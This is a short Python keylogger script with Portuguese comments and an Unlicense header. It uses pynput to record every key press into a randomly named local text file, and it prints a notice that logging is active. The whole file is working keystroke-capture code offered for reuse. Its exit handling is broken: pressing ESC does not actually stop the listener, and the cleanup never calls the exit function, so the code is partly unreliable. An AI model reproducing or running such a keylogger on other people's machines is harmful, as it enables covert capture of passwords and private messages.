__version__ = "1.0"
__author__ = "EvandroAbreu"
__license__ = "Unlicense"

#importando a biblioteca
from pynput.keyboard import Listener,Key
import random
import sys
#gerando nome do arquivo de log

def encerra_programa(key):
    print('Programa encerrado')
# função que escreve as teclas no arquivo de log
def escreve_key(key):
    try:
        with open(f'{log}','a') as file:
            file.write(f'{str(key)}\n')
    except Exception as e:
        print(f'Erro ao escrever no arquivo: {e}')
        encerra_programa(key)

# se a tecla for esc, encerra o programa
    if key == Key.esc:
        encerra_programa(key)
log = f'yek{random.randint(0,10000)}.txt'
print('As teclas estão sendo registradas... Pressione ESC para sair.')
# iniciando o listener
try:
    with Listener(on_press=escreve_key) as logs:
        logs.join()
# tratando possíveis erros ao iniciar o listener
except Exception as e:
    print(f'Erro ao iniciar o listener: {e}')
# garantindo que o listener será encerrado corretamente
finally:
    try:
        logs.stop()
        encerra_programa
    except Exception as e:
        print(f'Erro ao encerrar o programa: {e}')
